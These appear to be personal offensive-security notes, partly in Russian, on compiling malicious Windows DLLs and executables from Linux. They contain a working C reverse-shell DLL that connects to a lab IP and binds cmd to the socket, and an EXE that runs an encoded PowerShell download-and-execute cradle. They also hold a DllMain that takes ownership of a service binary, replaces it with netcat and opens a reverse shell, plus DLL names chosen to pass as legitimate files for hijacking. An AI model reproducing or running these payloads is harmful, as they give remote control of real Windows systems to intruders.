# c#c++
 
regsvr32.exe ReverseShellDLL.dll (запуск dll)
 
-static     компиляция со всеми билиотеками во внутрь

# Cоздание dll на с++

sudo apt install mingw-w64

x86_64-w64-mingw32-gcc-win32 shell.c -shared -lws2_32 -o VerifyThemeVersion.dll

x86_64-w64-mingw32-gcc xll.c -shared -o test.xll

# сщздание exe на с++
	sudo apt update && sudo apt install g++ -y

	g++ --version
	x86_64-w64-mingw32-g++ main.cpp -o shell.exe
	C++	g++	g++ file.cpp -o file	./file

python3 -m pefile exports VerifyThemeVersion.dll (скажет что за функции находятся внутри)

rundll32 shell,0

# самый простой exe shell 
 
	#include <windows.h>

	int main() {
	    WinExec("powershell -enc 		SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANwA6ADgAMAAwADAALwBzAGgAZQBsAGwAXwA5ADAAMAAxAC4AcABzADEAJwApAAoA", 1);
		}



----------------------
    #include <winsock2.h>
    #include <windows.h>
    #include <io.h>
    #include <process.h>
    #include <sys/types.h>
    #include <stdio.h>
    #include <stdlib.h>
     #include <string.h>



static int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
                write(2, "[ERROR] WSASturtup failed.\n", 27);
                return (1);
        }

        int port = CLIENT_PORT;
        struct sockaddr_in sa;
        SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = inet_addr(CLIENT_IP);


        if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
                write(2, "[ERROR] connect failed.\n", 24);
                return (1);
        }


        STARTUPINFO sinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES);
        sinfo.hStdInput = (HANDLE)sockt;
        sinfo.hStdOutput = (HANDLE)sockt;
        sinfo.hStdError = (HANDLE)sockt;
        PROCESS_INFORMATION pinfo;
        CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

        return (0);
}

void DllMain() {
        ReverseShell("192.168.50.123", 9001);
//        ReverseShell("10.10.14.20", 9001);
}
-----------------------------------------Вызывалка----------------------

x86_64-w64-mingw32-gcc-win32 test.c  -o test.exe
    --------------------------------
#include <windows.h>
#include <stdio.h>

int main( void )
{
        HINSTANCE hDll;

        // Load Dll
        hDll = LoadLibrary(TEXT("max.dll"));

        // If Dll Was Loaded
        if (hDll != NULL){
                printf("DLL Found\n");
                } else {
                printf("DLL Not Found");
                }
        return 0;
}

----------------------------------------------------ДЛЛКА

x86_64-w64-mingw32-gcc-win32 max.c  -o max.dll -shared

   ------------------------------------------

#include <windows.h>

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
        switch (dwReason)
        {
         case DLL_PROCESS_ATTACH:
          MessageBox(NULL,
                        "dsfvsdfsd",
                        "dsvsdvs",
                        MB_ICONERROR | MB_OK);
        break;
        }
return TRUE;
}


# Простая DLL на С

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)

{
  switch (dwReason)
{
case DLL_PROCESS_ATTACH:
        system("cmd.exe /c whoami /all > c:\\users\\public\\pleasesub.txt");

        system("cmd.exe /c takeown /F c:\\share\\bginfo64.exe");
        system("cmd.exe /c cacls c:\\share\\bginfo64.exe  /E /G ginawild:F");
        system("cmd.exe /c icacls c:\\share\\bginfo64.exe >> c:\\users\\public\\pleasesub.txt");

        system ("cmd.exe /c copy c:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe c:\\share\\bginfo64.exe");

        system ("cmd.exe /c copy c:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe c:\\share\\nc64.exe");

        system("cmd.exe /c c:\\share\\bginfo64.exe -e cmd.exe 10.10.14.37 9002");
        system("cmd.exe /c ping 10.10.14.37");

        break;
}
return TRUE;
}

# Компиляция C из линукс
	x86_64-w64-mingw32-gcc-win32 script.c -o 7-zip64.dll -shared
	gcc file.c -o file.exe	./file.exe

-----------------------------------------
# Компиляция C# из линукс

	sudo apt install mono-devel

	mcs -target:library -out:Shell.dll Shell.cs
	mcs file.cs -out:file.exe	

	и активация webdav https://gist.githubusercontent.com/klezVirus/af004842a73779e1d03d47e041115797/raw/29747c92ca04c844223d1ef6c1463d7e34e271ee/EtwStartWebClient.cs
	mcs startweb.cs /unsafe -out:start.exe

